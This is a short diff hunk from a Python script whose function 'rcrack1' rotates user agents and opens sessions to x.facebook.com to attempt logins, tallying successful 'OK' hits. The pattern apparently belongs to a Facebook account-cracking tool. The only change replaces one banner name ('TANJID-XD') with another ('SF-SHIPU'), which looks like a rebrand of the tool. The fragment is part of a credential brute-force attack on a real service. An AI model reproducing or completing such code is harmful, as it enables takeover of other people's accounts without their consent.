@@ -211,7 +211,7 @@ def rcrack1(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sTANJID-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sSF-SHIPU\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
